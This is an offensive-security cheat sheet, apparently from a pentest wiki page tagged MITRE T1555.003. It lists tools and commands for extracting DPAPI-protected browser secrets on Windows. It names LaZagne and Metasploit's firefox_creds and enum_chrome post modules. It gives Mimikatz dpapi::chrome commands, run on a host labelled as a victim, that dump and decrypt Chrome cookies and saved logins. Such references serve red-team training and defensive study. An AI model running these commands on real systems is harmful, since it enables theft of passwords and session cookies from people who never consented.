---
description: DPAPI stands for Data Protection API
coverY: 0
---

# 🟢 DPAPI - Applications

<details>

<summary>MITRE ATT&#x26;CK™ T1555.003</summary>



</details>

## Web browsers

<table data-full-width="true"><thead><tr><th width="117.33333333333331">Tool</th><th width="492">Description</th><th>Github</th></tr></thead><tbody><tr><td>LaZagne</td><td>The <strong>LaZagne project</strong> is an open source application used to <strong>retrieve lots of passwords</strong> stored on a local computer.</td><td><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></td></tr><tr><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td></tr></tbody></table>

### Metasploit

```
post/multi/gather/firefox_creds
```

```
post/windows/gather/enum_chrome
```

### MimiKatz

```
dpapi::chrome
```

### Dump Cookies

{% code title="rfs@victim02" %}
```powershell
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies"
```
{% endcode %}

### Dump Chrome Credentials

{% code overflow="wrap" %}
```powershell
mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
```
{% endcode %}
